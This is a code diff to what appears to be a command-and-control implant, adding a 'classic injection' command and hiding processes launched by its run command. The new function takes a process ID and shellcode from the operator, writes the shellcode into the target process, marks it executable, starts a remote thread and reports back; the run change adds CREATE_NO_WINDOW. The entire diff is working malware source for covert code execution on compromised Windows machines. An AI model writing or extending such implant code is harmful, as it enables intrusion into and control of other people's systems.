@@ -12,6 +12,7 @@ FUNC VOID CommandDispatcher(
     Instance()->Commands[ 4 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
     Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
     Instance()->Commands[ 6 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
+    Instance()->Commands[ 7 ] = { .ID = COMMAND_CLASSIC,  .Function = CommandClassicInjection };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -79,6 +80,71 @@ FUNC VOID CommandDispatcher(
     Instance()->Session.Connected = FALSE;
 }
 
+FUNC VOID CommandClassicInjection(
+    PPARSER Parser
+) {
+    BK_PACKAGE = PackageCreate( COMMAND_CLASSIC );
+
+    DWORD  Err = 0;
+    HANDLE ProcessHandle  = NULL;
+    DWORD  ProcessId      = ParserGetInt32( Parser );
+    UINT32 RegionSize     = 0;
+    PBYTE  ShellcodeBytes = ParserGetBytes( Parser, &RegionSize );
+    PVOID  MemAllocated   = NULL;
+    DWORD  ThreadId       = 0;
+    HANDLE ThreadHandle   = NULL;
+
+    BK_PRINT( "[I] Process Id into inject %d\n[I} Shellcode size %d \n", ProcessId, RegionSize );
+
+    Err = bkOpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+    if ( Err != 0 ) {
+        PackageTransmitError( Err );
+        return;
+    }
+
+    BK_PRINT( "[I] Process Handle: %X\n", ProcessHandle );
+
+    BK_PRINT( "[I] Handle to process opened!\n" );
+
+    Err = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+    if ( Err != 0 ) {
+        PackageTransmitError( Err );
+        return;
+    }
+
+    BK_PRINT( "[I] Memory allocated @ 0x%p\n", MemAllocated );
+
+    Err = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
+    if ( Err != 0 ) {
+        PackageTransmitError( Err );
+        return;
+    }
+
+    BK_PRINT( "[I] Memory written!\n" );
+
+    Err = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
+    if ( Err != 0 ) {
+        PackageTransmitError( Err );
+        return;
+    }
+
+    BK_PRINT( "[I] Memory protection changed to RX\n" );
+
+    Err = bkCreateThread( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
+    if ( Err != 0 ) {
+        PackageTransmitError( Err );
+        return;
+    }
+
+    BK_PRINT( "[I] Thread create succefully %d\n", ThreadId );
+
+    PackageAddInt32( BK_PACKAGE, ProcessId );
+    PackageAddInt32( BK_PACKAGE, ThreadId );
+    PackageAddInt64( BK_PACKAGE, CST_U64( MemAllocated ) );
+    PackageAddInt32( BK_PACKAGE, RegionSize );
+    PackageTransmit( BK_PACKAGE, NULL, NULL );
+}
+
 FUNC VOID CommandMemory( 
     _In_ PPARSER Parser    
 ) {
@@ -128,7 +194,7 @@ FUNC VOID CommandRun(
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
 
-    bCheck = bkCreateProcess( ProcCmd, TRUE, NULL, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
+    bCheck = bkCreateProcess( ProcCmd, FALSE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
     if ( !bCheck )
         return;
 
